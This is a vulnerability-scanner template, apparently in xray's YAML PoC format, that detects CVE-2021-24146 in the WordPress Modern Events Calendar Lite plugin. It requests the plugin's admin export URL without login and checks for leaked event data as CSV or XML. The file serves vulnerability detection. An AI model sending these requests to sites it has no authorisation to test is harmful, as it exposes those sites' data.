name: poc-yaml-wordpress-modern-events-calendar-lite-cve-2021-24146-info-leak
binding: 1f63d50c-8da9-4a36-a25c-e7b3ba4c74f6
manual: true
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://www.tenable.com/cve/CVE-2021-24146
    vulnerability:
        id: CT-150639
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=csv
        expression: response.status == 200 && response.headers["Content-Disposition"].contains('filename="mec-events') && response.content_type.contains("text/csv") && response.body.bstartsWith(b"ID")
    r1:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=xml
        expression: response.status == 200 && response.headers["Content-Disposition"].contains('filename="mec-events') && response.content_type.contains("application/force-download") && response.body.bstartsWith(b"<?xml")
expression: r0() || r1()
